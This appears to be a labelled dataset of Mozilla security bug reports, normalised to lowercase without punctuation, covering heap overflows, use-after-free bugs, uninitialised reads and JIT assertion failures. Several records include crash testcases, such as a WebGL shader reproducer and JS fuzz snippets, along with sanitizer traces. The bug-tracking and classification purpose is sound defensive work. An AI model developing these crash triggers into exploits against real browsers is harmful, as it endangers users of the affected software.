2 xul.dll mozilla layers imagelayer imagelayer gfx/layers/imagelayers.cpp:18 3 xul.dll mozilla layers imagelayer scalar deleting destructor 4 xul.dll nswindow onpaint widget/windows/nswindowgfx.cpp:420 5 xul.dll nswindow processmessage widget/windows/nswindow.cpp:4727 6 xul.dll nswindow windowprocinternal widget/windows/nswindow.cpp:4336 7 xul.dll callwindowproccrashprotected xpcom/base/nscrashonexception.cpp:32 8 xul.dll nswindow windowproc widget/windows/nswindow.cpp:4282 9 user32.dll internalcallwinproc 10 user32.dll ntusergetdc 11 user32.dll dispatchclientmessage 12 user32.dll fndword 13 ntdll.dll kiusercallbackdispatcher 14 ntdll.dll kiuserapcdispatcher 15 xul.dll nswindow show widget/windows/nswindow.cpp:1189 16 xul.dll nsxulwindow setvisibility xpfe/appshell/src/nsxulwindow.cpp:795 17 xul.dll nsxulwindow onchromeloaded xpfe/appshell/src/nsxulwindow.cpp:992 18 xul.dll nswebshellwindow onstatechange xpfe/appshell/src/nswebshellwindow.cpp:563 19 xul.dll nsdocloader dofireonstatechange uriloader/base/nsdocloader.cpp:1351 20 xul.dll nsdocloader dostopdocumentload uriloader/base/nsdocloader.cpp:942 more reports at	11
mesa heap buffer overflow exposed by webgl mirroring chrome issue 145525 this is originally reported by miaubiz vulnerability details heap buffer overflow in gpu process with webgl version chrome version dev operating system 64bit linux reproduction case html head script id vshader type x-shader/x-vertex attribute vec4 vposition void main gl_position vposition script script id fshader type x-shader/x-fragment precision mediump float uniform float color 3 void main gl_fragcolor vec4 color 0 0 0 0 script script function shader gl program shadertype shaderid var shadersource document.getelementbyid shaderid text var shader gl.createshader shadertype gl.shadersource shader shadersource gl.compileshader shader gl.attachshader program shader function loadprogram gl var program gl.createprogram shader gl program gl.vertex_shader vshader shader gl program gl.fragment_shader fshader gl.linkprogram program return program var gl document.createelement canvas getcontext experimental-webgl var program loadprogram gl var elemloc gl.getuniformlocation program color 2 var value gl.getuniform program elemloc script head body body html for crashes please include the following additional information type of crash gpu asan crash state 21671 error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 1 at thread t0 0 in interceptor_memcpy 0 1 in 0 is located 4 bytes to the right of 52-byte region allocated by thread t0 here 0 in interceptor_calloc 0 1 in 0	11
assertion failure lifetime entry uint32_t entrytarget outerscript code mjitchunklimit 35 eval 0 l switch 5 case 1 c break while a asserts js debug shell on m-c changeset 2937fd8e35a1 with a at assertion failure lifetime entry uint32_t entrytarget outerscript code assuming related to bug 747226 s-s and assuming sec-critical because similar previously-found assertions were also s-s due to skipped revisions the first bad revision could be any of changeset 106120:300ac3d58291 user david anderson date thu apr 19 15:02:11 2012 0700 summary enable jits and type inference by default and give ion first chance bug 724751 r=jandem changeset 106121 de015aff650d user david anderson date thu apr 19 15:02:47 2012 0700 summary enable ionmonkey in the browser and introduce an about config option to pref it off bug 745390 r=dmandelin changeset 106122:9e64f779b611 user david anderson date thu apr 19 16:57:58 2012 0700 summary disable typescript setscope bug 747226 r=bhackett changeset 106123 bc1833f2111e user christian holler date mon apr 23 17:32:32 2012 0200 summary bug 747902 add ion n and m flags back for compatibility	11
opus heap-buffer-overflow crash opus_multistream_decoder_init media/libopus/src/opus_multistream.c:537 st layout.nb_channels channels we see the following warning before the crash warning opus end trimming removed more than a full packet file users/cdiehl/code/mozilla/mc-asan-opt/content/media/ogg/oggcodecstate.cpp line 1147 tested with m-c changeset 113558:9a6d708faf3f	11
use after free in mesa 8.0 after calling teximage2d on texture already attached to fbo in texture-attachment-formats.html test the webgl conformance test now fails under fedora 18 with the latest xorg drivers and trunk firefox on both nvdia and amd/ati graphics i have this issue on 4 different systems crash reports and graphics info in follow-on comments	11
webgl crash mozilla webglcontext clear during conformance test device id 0x fd5 gpu accelerated windows 1/1 opengl vendor id webgl renderer nvidia corporation nvidia geforce gt 650m opengl engine	11
opus crash due to race opus_multistream_decode_native i am guessing that this crash is triggered by a race condition inside the media decoder state machine to reproduce reload the testcase with cmd+r or f5 a few times the crashing location will vary on each execution tested with changeset 114362 c63d5cff18ba	11
assertion failure i length invalid array index at dist/include/nstarray.h:535 the attached html code triggers an assertion on fennec native mozilla-central debug build rev e240d6e43c9a might need 2-3 runs to actually abort the assertion did not trigger on a firefox desktop debug build for me marking s-s because this could be an out-of-range problem	11
opt-only crash with invalid read js gc markinternal jsscript the following testcase crashes on mozilla-central revision 90857937b601 run with ion-eager gczeal 2 2 evaluate function f r arguments test yield 170 function test for var i in f test newcontext true compileandgo false global newglobal new-compartment	11
heap-use-after-free read nsiframe getstylecontext asan debug build on linux64 compiled with ac_add_options enable-optimize faddress-sanitizer dxmalloc=myxmalloc ddebug_tracemalloc_presarena ac_add_options enable-debug that is disabling the pres shell arena steps to reproduce 1 run firefox with a fresh profile 2 click on a menu item say tools then close it 3 exit actual results 8983 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsiframe getstylecontext const 0 1 in nsiframe prescontext const dist/include/nsiframe.h:572 2 in nsiframe properties const layout/svg generic/nsiframe.h:2619 3 in displayitemdata layout/base/framelayerbuilder.cpp:142 4 in mozilla framelayerbuilder displayitemdata release layout/base/framelayerbuilder.h:498 5 in nsrefptr layout/base dist/include/nsautoptr.h:874 6 in nsrefptr layout/base dist/include/nsautoptr.h:875 7 in nsrefptrhashkey layout/base dist/include/nshashkeys.h:294 8 in nsrefptrhashkey layout/base dist/include/nshashkeys.h:294 9 in nsthashtable nsrefptrhashkey mozilla framelayerbuilder displayitemdata s_clearentry pldhashtable pldhashentryhdr layout/base dist/include/nsthashtable.h:464 10 in pl_dhashtablefinish xpcom/build/pldhash.cpp:363 11 in nsthashtable layout/base dist/include/nsthashtable.h:385 12 in nsthashtable layout/base dist/include/nsthashtable.h:385 13 in layermanagerdata layout/base/framelayerbuilder.cpp:185 14 in layermanagerdata layout/base/framelayerbuilder.cpp:185 15 in layermanagerdata layout/base/framelayerbuilder.cpp:183 16 in layermanageruserdatadestroy layout/base dist/include/layers.h:119 17 in mozilla gfx userdata destroy gfx/2d/userdata.h:98 18 in mozilla layers layermanager destroy gfx/layers/layers.h:164 19 in nswindow destroy widget/gtk2/nswindow.cpp:618 20 in nsview destroywidget view/src/nsview.cpp:108 21 in nsview view/src/nsview.cpp:92 22 in nsview view/src/nsview.cpp:43 23 in nsiview destroy view/src/nsview.cpp:152 24 in nsframe destroyfrom nsiframe layout/generic/nsframe.cpp:674 25 in nssplittableframe destroyfrom nsiframe layout/generic/nssplittableframe.cpp:44 26 in nscontainerframe destroyfrom nsiframe layout/generic/nscontainerframe.cpp:238 27 in nsboxframe destroyfrom nsiframe layout/xul/base/src/nsboxframe.cpp:949 28 in nsmenupopupframe destroyfrom nsiframe layout/xul/base/src/nsmenupopupframe.cpp:1827	11
uninitialized value usage in mailnews/base/src/nsmsgdbview.cpp uninitialized value usage in mailnews/base/src/nsmsgdbview.cpp found by valgrind run see bug 803816 about mozmill run of tb source version comm-central thunderbird hg identify 1016cef82fd8 tip ishikawa debian-vm tb-new/tb-3hg/new-src cd mozilla ishikawa debian-vm tb-new/tb-3hg/new-src/mozilla hg identify a517f7ea5bef tip valgrind log 30518 conditional jump or move depends on uninitialised value s 30518 at nsmsgdbview getinsertindexhelper nsimsgdbhdr nstarray unsigned int nstarraydefaultallocator nscomarray nsimsgfolder int int nsmsgdbview.cpp:5227 30518 by nsmsgdbview getinsertindex nsimsgdbhdr nsmsgdbview.cpp:5301 30518 by nsmsgsearchdbview inserthdrfromfolder nsimsgdbhdr nsimsgfolder nsmsgsearchdbview.cpp:655 30518 by nsmsgsearchdbview onsearchhit nsimsgdbhdr nsimsgfolder nsmsgsearchdbview.cpp:691 30518 by nsmsgsearchsession addsearchhit nsimsgdbhdr nsimsgfolder nsmsgsearchsession.cpp:549 30518 by nsmsgsearchofflinemail addresultelement nsimsgdbhdr nsmsglocalsearch.cpp:788 30518 by nsmsgsearchofflinemail search bool nsmsglocalsearch.cpp:741 30518 by nsmsgsearchscopeterm timeslice bool nsmsgsearchterm.cpp:1881 30518 by xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode xpcwrappednative.cpp:3132 30518 by xpc_wn_callmethod jscontext unsigned int js value xpcwrappednativejsops.cpp:1488 30518 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:364 30518 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2369 30518 by js runscript jscontext js handle jsscript js stackframe jsinterp.cpp:324 30518 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:379 30518 by js invoke jscontext js value const js value const unsigned int js value js value jsinterp.h:109 30518 by js indirectproxyhandler call jscontext jsobject unsigned int js value jsproxy.cpp:456 30518 by js directwrapper call jscontext jsobject unsigned int js value jswrapper.cpp:390 30518 by js crosscompartmentwrapper call jscontext jsobject unsigned int js value jswrapper.cpp:722 30518 by js proxy call jscontext jsobject unsigned int js value jsproxy.cpp:2478 30518 by proxy_call jscontext unsigned int js value jsproxy.cpp:3038 30518 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:364 30518 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2369 30518 by js runscript jscontext js handle jsscript js stackframe jsinterp.cpp:324 30518 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:379 30518 by js invoke jscontext js value const js value const unsigned int js value js value jsinterp.h:109 30518 by js indirectproxyhandler call jscontext jsobject unsigned int js value jsproxy.cpp:456 30518 by js directwrapper call jscontext jsobject unsigned int js value jswrapper.cpp:390 30518 by js crosscompartmentwrapper call jscontext jsobject unsigned int js value jswrapper.cpp:722 30518 by js proxy call jscontext jsobject unsigned int js value jsproxy.cpp:2478 30518 by proxy_call jscontext unsigned int js value jsproxy.cpp:3038 30518 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:364 30518 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2369 30518 by js runscript jscontext js handle jsscript js stackframe jsinterp.cpp:324 30518 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:379 30518 by js invoke jscontext js value const js value const unsigned int js value js value jsinterp.h:109 30518 by js_callfunctionvalue jsapi.cpp:5901 30518 by nsjscontext calleventhandler nsisupports jsobject jsobject nsiarray nsivariant nsjsenvironment.cpp:1914 30518 by nsjseventlistener handleevent nsidomevent nsjseventlistener.cpp:212 30518 by nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsidomeventtarget unsigned int nscxpusher nseventlistenermanager.cpp:868 30518 by nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher nseventlistenermanager.cpp:941 30518 by nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher nseventlistenermanager.h:144 30518 by 30518 uninitialised value was created by a stack allocation 30518 at nsmsgdbview getinsertindexhelper nsimsgdbhdr nstarray unsigned int nstarraydefaultallocator nscomarray nsimsgfolder int int nsmsgdbview.cpp:5198 30518 observation local variable fieldtype is not initialized but is supposed to be set by getfieldtypeandlenforsort however checking getfieldtypeandlenforsort in the same file reveals that there is an error path in which the third argument is not set and the function returns ns_error_unexpected in the code below quoted from nsmsgdbview.cpp the return value is not checked at all and thus the third argument fieldtype is undefined but unnoticed so the uninitialized fieldtype is referenced in the switch statement that follows clearly something is wrong here 5195 nsmsgviewindex nsmsgdbview getinsertindexhelper nsimsgdbhdr msghdr nstarray nsmsgkey keys 5196 nscomarray nsimsgfolder folders 5197 nsmsgviewsortordervalue sortorder nsmsgviewsorttypevalue sorttype 5198 5199 nsmsgviewindex highindex keys.length 5200 nsmsgviewindex lowindex 0 5201 idkeyptr entryinfo1 entryinfo2 5202 entryinfo1.key nullptr 5203 entryinfo2.key nullptr 5204 5205 nsresult rv 5206 uint16_t maxlen 5207 efieldtype fieldtype 5208 rv getfieldtypeandlenforsort sorttype maxlen fieldtype 5209 const void pvalue1 entryinfo1 pvalue2 entryinfo2 5210 5211 int comparisonfun const void pitem1 const void pitem2 void privatedata nullptr 5212 int retstatus 0 5213 msghdr getmessagekey entryinfo1.id 5214 msghdr getfolder entryinfo1.folder 5215 entryinfo1.folder release 5216 check if a custom column handler exists if it does then grab it and pass it in 5217 to either getcollationkey or getlongfield 5218 nsimsgcustomcolumnhandler colhandler getcurcolumnhandlerfromdbinfo 5219 5220 viewsortinfo comparisoncontext 5221 comparisoncontext.view this 5222 comparisoncontext.issecondarysort false 5223 comparisoncontext.ascendingsort sortorder nsmsgviewsortorder ascending 5224 rv entryinfo1.folder getmsgdatabase comparisoncontext.db 5225 ns_ensure_success rv highindex 5226 comparisoncontext.db release 5227 switch fieldtype 5228 the full log is in bug 803816 there could be a security implication since use of uninitialized variable led to many exploits in other software packages before so i am setting security status just in case please reset it is fixed or is not quite security-related	11
update ots to r95 we should update ots to r95 to fix an out of bounds issue	11
js oom testing assertion failure off 0 size_t off size at js/src/jsopcode.cpp:786 the following command asserts on mozilla-central revision f4d51fab6cec dbg build js e const libdir home/decoder/mozilla/jsbugmon/repos/ionmonkey/js/src/jit-test/lib a 8202 f home/decoder/mozilla/jsbugmon/repos/ionmonkey/js/src/jit-test/tests/for-of/decompiler.js	11
assertion failure jsid_is_void id with xbl proto assertion failure jsid_is_void id at js/src/jsscope.cpp:617	11
crash in nsxulpopupmanager hidepopupcallback nsmenupopupframe hidepopup with testpilot it s a low volume crash in 15.0 but much higher in 17.0a2 where it s 14 top browser crasher signature nsmenupopupframe hidepopup bool nspopupstate more reports search uuid c1acceb4-a6e9-444f-a5bb-f936b2120902 date processed 2012-09-02 17:20:07 uptime 735 install age 1.3 hours since version was first installed install time 2012-09-02 16:04:00 product firefox version 17.0a2 build id 20120901042009 release channel aurora os windows nt os version 5.1.2600 dodatek service pack 3 build architecture x86 build architecture info authenticamd family 16 model 4 stepping 2 crash reason exception_access_violation_exec crash address app notes adaptervendorid adapterdeviceid adaptersubsysid 040110b0 adapterdriverversion 8.970.100.3000 d3d10 layers d3d10 layers d3d9 layers d3d9 layers emcheckcompatibility true adapter vendor id adapter device id total virtual memory 2147352576 available virtual memory 1833201664 system memory use percentage 21 available page file 4861616128 available physical memory 2730385408 frame module signature source 0 1 xul.dll nsmenupopupframe hidepopup layout/xul/base/src/nsmenupopupframe.cpp:795 2 xul.dll nsxulpopupmanager hidepopupcallback layout/xul/base/src/nsxulpopupmanager.cpp:879 3 xul.dll nsxulpopupmanager firepopuphidingevent layout/xul/base/src/nsxulpopupmanager.cpp:1231 4 xul.dll nsxulelement addref content/xul/content/src/nsxulelement.cpp:312 5 mozjs.dll js_getframefunctionobject js/src/jsdbgapi.cpp:597 6 xul.dll nspopupboxobject hidepopup layout/xul/base/src/nspopupboxobject.cpp:49 7 xul.dll ns_invokebyindex_p xpcom/reflect/xptcall/src/md/win32/xptcinvoke.cpp:70 8 xul.dll xpcnativemember resolve js/xpconnect/src/xpcwrappednativeinfo.cpp:102 9 xul.dll nsxpconnect getxpconnect js/xpconnect/src/nsxpconnect.cpp:139 10 xul.dll xpcwrappednative getattribute js/xpconnect/src/xpcprivate.h:2822 11 gkmedias.dll define_gf_group media/libvpx/vp8/encoder/firstpass.c:1800 more reports at	11
write after free related to mozilla tracerrunnable tracerrunnable multiple read and write-after-free and double free errors observed at shutdown on fennec str build with profiler sps support start fennec start the profiler using toggle sampling in the main menu then use main menu to quit there are multiple invalid memory accesses ending in a segfault which may or may not be related	11
cycle collector can be made to unlink live objects by using weak maps or watchpoints as i reported earlier in bug 667011 igor figured out that my patch in bug 653248 can cause the cc to incorrectly consider reachable objects to be garbage it turns out that this is actually also the case for trunk without that patch applied too i discovered this after writing a test case for bug 667011 anyways so the result of this is that you can make the cycle collector call unlink on any object you can manipulate with javascript even if the object is n't actually dead in my particular test case this is not a danger because the unlink just removes the child which can be done anyways but i m not sure how safe this is in general do you have any idea peter my test case is a mochitest chrome test but the only high privilege thing i do is explicitly call the gc and cc you could probably just wait a minute for them to be called naturally running the test case results in the following message mochitest-chrome failed 6 error test-unexpected-fail chrome mochitests/content/chrome/js/src/xpconnect/tests/chrome/test_bug653248.xul dom element indirectly reachable via gray weak map entry was unlinked did n't expect null but got it val_elem gets unlink called on it causing its child to be dropped but we can still get to val_elem because it is being held live by a js wrapper and is reachable by the weak map this weak map edge is invisible to the cycle collector because the map itself is black and in the current code the cc is not told about the connection from the key to the value in the previous bug i thought this would n't be a problem on trunk because the gc marks weak map entries black which is what my patch was fixing but i was n't thinking about the fact that the weak reference marking phase violates a very important gc invariant never mark black after gray we should enforce this more rigorously or make it not a problem by making black overwrite gray if the gray marking gets to an object reachable from both black and grey before the black marking gets there it will end up gray if an object is gray when it should be black then the cc can end up freeing a reachable object in my example code i create a cycle between a dom element val_elem and the weak map entry value v which means that the entry gets marked gray before weak map marking happens the cc then traces from val_elem and decides it is garbage	11
fix assertion we should never be reusing a shared inner window with pagehide event assertion we should never be reusing a shared inner window currentinner isfrozen file dom/base/nsglobalwindow.cpp line 1776	11
crash access violation mozjs js types autoentercompilation autoentercompilation this bug was initially created as a clone of bug 743221 perhaps related to bug 743221 unclear as yet captured by windbg having trouble recalling steps at the moment 74e0.d44 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=2238525c ebx=2866c000 ecx=22385000 edx=0749df00 esi=7eb00000 edi=002c8370 eip=678d1eaa esp=002c8358 ebp=002c8378 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 warning unable to verify checksum for c program files\mozilla.org\ff 17.0a1 2012-08-02\mozjs.dll mozjs js types autoentercompilation autoentercompilation 678d1eaa 8b0e mov ecx dword ptr esi ds:0023:7eb00000 0:000 kp analyze f lm 0 id 74e0.d44 suspend 1 teb 7ffdf000 unfrozen childebp retaddr 002c835c 678ebf04 mozjs js types autoentercompilation autoentercompilation void e builds\moz2_slave\m-cen-w32-ntly\build\js\src\jsinferinlines.h 286 002c8378 678ec0fa mozjs js mjit compiler performcompilation void e builds\moz2_slave\m-cen-w32-ntly\build\js\src\methodjit\compiler.cpp 510 002c8388 678ec45f mozjs js mjit compiler compile void e builds\moz2_slave\m-cen-w32-ntly\build\js\src\methodjit\compiler.cpp 112 002cc4a0 67848f99 mozjs js mjit canmethodjit struct jscontext cx struct jsscript script unsigned char pc w bool construct false js mjit compilerequest request compilerequest_interpreter 0n0 class js stackframe frame e builds\moz2_slave\m-cen-w32-ntly\build\js\src\methodjit\compiler.cpp 998 002ccd9c 67851d70 mozjs js interpret struct jscontext cx class js stackframe entryframe js interpmode interpmode jsinterp_normal 0n0 e builds\moz2_slave\m-cen-w32-ntly\build\js\src\jsinterp.cpp 2446 002cce10 678523fa mozjs js invokekernel struct jscontext cx class js callargs args class js callargs js maybeconstruct construct no_construct 0n0 e builds\moz2_slave\m-cen-w32-ntly\build\js\src\jsinterp.cpp 356 002cce58 67872ea1 mozjs js invoke struct jscontext cx class js value thisv class js value fval unsigned int argc 0 class js value argv class js value rval e builds\moz2_slave\m-cen-w32-ntly\build\js\src\jsinterp.cpp 388 warning unable to verify checksum for c program files\mozilla.org\ff 17.0a1 2012-08-02\xul.dll 002cce8c 59a6035a mozjs js_callfunctionvalue struct jscontext cx struct jsobject objarg class js value fval class js value unsigned int argc 0 class js value argv class js value rval e builds\moz2_slave\m-cen-w32-ntly\build\js\src\jsapi.cpp 5836 002cd030 59a31f3b xul nsjscontext calleventhandler class nsisupports atarget struct jsobject ascope struct jsobject ahandler class nsiarray aargv class nsivariant arv e builds\moz2_slave\m-cen-w32-ntly\build\dom\base\nsjsenvironment.cpp 1929 002cd08c 59a3a428 xul nsglobalwindow runtimeouthandler struct nstimeout atimeout class nsiscriptcontext ascx e builds\moz2_slave\m-cen-w32-ntly\build\dom\base\nsglobalwindow.cpp 9555 002cd118 59b7bacc xul nsglobalwindow runtimeout struct nstimeout atimeout e builds\moz2_slave\m-cen-w32-ntly\build\dom\base\nsglobalwindow.cpp 9806 002cd130 59a73a54 xul nsglobalwindow timercallback class nsitimer atimer void aclosure e builds\moz2_slave\m-cen-w32-ntly\build\dom\base\nsglobalwindow.cpp 10072 002cd160 59aa6960 xul nstimerimpl fire void e builds\moz2_slave\m-cen-w32-ntly\build\xpcom\threads\nstimerimpl.cpp 473 002cd1d0 59a6e6d9 xul nsthread processnextevent bool maywait false bool resu	11
possible use-after-cc-unlink due to incorrect cycle collector weakmap optimizations in pseudocode the gc s weakmap markiteratively works like this if key is marked mark value else delegate is marked mark key mark value this means that even if the value is marked when we start the key will get marked if the delegate is marked on the other hand the cycle collector will bail out at a number of points traceweakmapping gcgraphbuilder noteweakmapping maybe other places if the value is marked black so we never hit the equivalent code in scanweakmaps which i think means that the key can end up being marked as dead in the cc when it is alive in the gc which means we ll unlink a live object which is not awesome i do n't really want to eliminate the optimization entirely as i imagine the bulk of things in weak maps are black maybe changing the bailouts to check if the key and value are black would work i do n't really want to model full logic from markiteratively in the optimization that is in the plumbing	11
conditional jump/move depends on uninitialized data in quartz backend launching firefox on 10.7 inside vmware pointing at the url mentioned here gives me a slew of warnings of use of uninitialized data starting with this warning i suspect that we re using the quartz backend to draw a screenshot so it might help to have an empty profile so firefox wants to draw a screenshot of the page you re on 45780 conditional jump or move depends on uninitialised value s 45780 at mozilla gfx drawtargetcg init mozilla gfx backendtype unsigned char mozilla gfx intsize const int mozilla gfx surfaceformat drawtargetcg.cpp:884 45780 by mozilla gfx drawtargetcg init mozilla gfx backendtype mozilla gfx intsize const mozilla gfx surfaceformat drawtargetcg.cpp:974 45780 by mozilla gfx factory createdrawtarget mozilla gfx backendtype mozilla gfx intsize const mozilla gfx surfaceformat factory.cpp:193 45780 by gfxplatform createdrawtargetforbackend mozilla gfx backendtype mozilla gfx intsize const mozilla gfx surfaceformat gfxplatform.cpp:728 45780 by gfxplatform createoffscreendrawtarget mozilla gfx intsize const mozilla gfx surfaceformat gfxplatform.cpp:736 45780 by mozilla layers layermanager createdrawtarget mozilla gfx intsize const mozilla gfx surfaceformat layers.cpp:250 45780 by mozilla dom canvasrenderingcontext2d ensuretarget canvasrenderingcontext2d.cpp:792 45780 by mozilla dom canvasrenderingcontext2d scale double double mozilla errorresult canvasrenderingcontext2d.cpp:1905 45780 by mozilla dom canvasrenderingcontext2dbinding scale jscontext js handle jsobject mozilla dom canvasrenderingcontext2d unsigned int js value canvasrenderingcontext2dbinding.cpp:116 45780 by mozilla dom canvasrenderingcontext2dbinding genericmethod jscontext unsigned int js value canvasrenderingcontext2dbinding.cpp:3244 45780 by js calljsnative jscontext int jscontext unsigned int js value js callargs const jscntxtinlines.h:364 45780 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:362 45780 uninitialised value was created by a heap allocation 45780 at malloc in usr/local/cellar/valgrind/3.8.1/lib/valgrind/vgpreload_memcheck-amd64-darwin.so 45780 by operator new unsigned long in usr/lib/libstdc++.6.0.9.dylib 45780 by mozilla gfx factory createdrawtarget mozilla gfx backendtype mozilla gfx intsize const mozilla gfx surfaceformat factory.cpp:192 45780 by gfxplatform createdrawtargetforbackend mozilla gfx backendtype mozilla gfx intsize const mozilla gfx surfaceformat gfxplatform.cpp:728 45780 by gfxplatform createoffscreendrawtarget mozilla gfx intsize const mozilla gfx surfaceformat gfxplatform.cpp:736 45780 by mozilla layers layermanager createdrawtarget mozilla gfx intsize const mozilla gfx surfaceformat layers.cpp:250 45780 by mozilla dom canvasrenderingcontext2d ensuretarget canvasrenderingcontext2d.cpp:792 45780 by mozilla dom canvasrenderingcontext2d scale double double mozilla errorresult canvasrenderingcontext2d.cpp:1905 45780 by mozilla dom canvasrenderingcontext2dbinding scale jscontext js handle jsobject mozilla dom canvasrenderingcontext2d unsigned int js value canvasrenderingcontext2dbinding.cpp:116 45780 by mozilla dom canvasrenderingcontext2dbinding genericmethod jscontext unsigned int js value canvasrenderingcontext2dbinding.cpp:3244 45780 by js calljsnative jscontext int jscontext unsigned int js value js callargs const jscntxtinlines.h:364 45780 by js invokekernel jscontext js callargs js maybeconstruct jsinterp.cpp:362	11
crash js encapsulatedptr or js types typeobject print or assertion failure infer failure missing type in object lastindex int regexp.prototype.lastindex this gc newglobal eval regexp lastindex crashes js debug shell on m-c changeset fd8fd1a7aecd with a at js encapsulatedptr during the process of reduction the following assert showed up also with a assertion failure infer failure missing type in object lastindex int with the testcase function g z newglobal return function code evalcx code z f g f this.regexp.prototype.lastindex=this gc f regexp lastindex s-s and sec-critical because it s a type inference failure and involves gc feel free to change this when shown not to be s-s autobisect shows this is probably related to the following changeset the first bad revision is changeset 108156:7228effb2e5b user bill mccloskey date mon sep 03 16:42:22 2012 0700 summary bug 787856 use lazy protos for cross-compartment wrappers r=bholley	11
compartment mismatch in nswindowsh newresolve for content with xrays i came across across 3 of these these are on builds from 12/29 and 1/1 the stacks vary but they look kind of like this 0 js compartmentchecker fail js/src/jscntxtinlines.h:205 1 js compartmentchecker check js/src/jscntxtinlines.h:221 2 js_newfunction js/src/jsapi.cpp:4839 3 nswindowsh newresolve dom/base/nsdomclassinfo.cpp:6902 4 xpc xpcwrappednativexraytraits resolveownproperty js/xpconnect/wrappers/xraywrapper.cpp:995 5 xpc xraywrapper js crosscompartmentwrapper xpc xpcwrappednativexraytraits g it looks like the window s global object is from a different compartment than the context passed into newresolve i do n't know if this is useful or not	11
compartment mismatch in nsxmlhttprequest getinterface with addon there are a number of these but they all appear to be from the same linux user a few minutes apart 2 js_getglobalforobject js/src/jsapi.cpp:2241 3 nsxmlhttprequest getinterface content/base/src/nsxmlhttprequest.cpp:3874 4 mozilla dom xmlhttprequestbinding getinterface obj-firefox/dom/bindings/xmlhttprequestbinding.cpp:1197 5 mozilla dom xmlhttprequestbinding genericmethod obj-firefox/dom/bindings/xmlhttprequestbinding.cpp:1277 this user has bittorrent_webui_2 firefox.alexisbrunet.com firebug and sharemenot so perhaps one of those is the underlying problem	11
fix nsdocument flushpendingnotifications looks suspicious 6715 callers of flushpendingnotifications should keep the document alive that does n't always happen since since even within nsdocument flushpendingnotifications itself it calls mparentdocument flushpendingnotifications and mparentdocument is a member variable and does n't guarantee that the object stays alive during the call if something ends up clearing the member variable any objections if i add some nscomptrs to keep stuff alive long enough unfortunately that may show up in some profiles	11
jar/zip crash nsziparchive buildsynthetics/hashname this crash happened while fuzzing the jar/zip parser modules/libjar/nsziparchive.cpp:791 static uint32_t hashname const char aname uint16_t len while p endp val val 37 p to reproduce load the testcase like jar file users/cdiehl/desktop/testcase.jar tested with m-c changeset 119051 ff2e30afa205	11
crash opentypereorderingoutput getstringindex with measuretext kannada script zwj loading the testcase makes firefox crash opentypereorderingoutput getstringindex for mac os x 10.7.4 11e53 this appears as coretext bp-53a19b57-4ff8-4617-8835-b68db2120620	11
plugin scroll position listener callback may destroy listener list crash of bug 788436 smaug noticed that the crash in bug 788436 could be caused because while we are iterating over the list of scroll position listeners in nsgfxscrollframeinner scrolltoimpl the nsplugininstanceowner scrollpositionwillchange call could easily end up in plugin code that could potentially do anything including change the list of scroll position listeners and cause the crash filing this non-public bug so we can discuss this potential security problem	11
ionmonkey enable stackiter fp assertion currently there is a remaining comment on top of stackiter fp asking for adding ision to the assertion one use case is comming from fun_getproperty and another is coming from pushexecuteframe under debuggerframe_eval i am have n't investigated all the risk yet so i flagging this as s-s in the mean time and flag it for ff18	11
ionmonkey crash jsstring isatom with invalid read the following testcase crashes on mozilla-central revision 22d192c5d1fd run with ion-eager var gtestcases new array var gtc gtestcases.length function testcase n d e a this.bugnumber typeof bugnumer undefined bugnumber gtestcases gtc this testcase.prototype.dump function this.path this.bugnumber reason function reportcompare expected actual description var testcase new testcase function exitfunc funcname reportcompare function jstestdriverend for var i 0 i gtestcases.length i gtestcases i dump evaluate new testcase new testcase var bugnumber 359062 schedulegc 10 jstestdriverend print expect bugnumer test skipped script object required exitfunc test jstestdriverend noscriptrval true	11
ionmonkey assertion failure mir type mirtype_value at ion/shared/lowering-shared-inl.h:413 or crash js ion linearscanallocator populatesafepoints the attached testcase asserts on mozilla-central revision ec10630b1a54 run with ion-eager	11
jsdebugerrorhook could trigger gc out of oom handler spidermonkey s gc is not prepared to handle this case the jsdebugerrorhook is only used by jsd which is only used by firebug we need to ensure that firebug does nothing that could trigger gc in this path including running any js code we should remove this callback from the oom path for future versions since there is n't much of anything useful that firebug or anyone could do with an oom callback i doubt this will be problematic honza do you see any problems from firebug s perspective if we just remove this callback from js_reportoutofmemory	11
regexpcompartment sweep should mark the atom if the entry is n't removed normally we clear out all entries of the regexp cache the exception is when a regexp is currently executing and then that regexp gets to stay in the cache in this case we fail to mark the jsatom that serves as the key so it can become garbage iiuc we do n't use the key other than for equality matching so this error only manifests itself as the cache returning the wrong regexp for the given source from the same compartment so not an information leak i tried to write a test-case but the conservative gc thwarted all my attempts since the window of opportunity is small credit to ginn chen for reproducing and tracking down this bug	11
do a better job handling failure in jscompartment wrap since bug 793904 we re supposed to crash intentionally if a brain transplant fails however i realized that i missed a few cases where a brain transplant happens so this patch adds some more moz_crash calls however these extra calls make us crash during a js reftest that uses up lots of stack and causes the recursion check in jscompartment wrap to fail i considered taking out the recursion check but it still seems useful given that precreate hooks could conceivably cause recursive wrap calls so instead i just gave the wrap call a little extra c stack to work with than the rest of the engine gets i think this makes sense given how important it is that brain transplants succeed note that c stack limit we use is a made-up number that s conservative so we should have some leeway to exceed it as long as we do n't go too far	11
jscompartment global needs a read barrier let us have pity on this field for it is weak	11
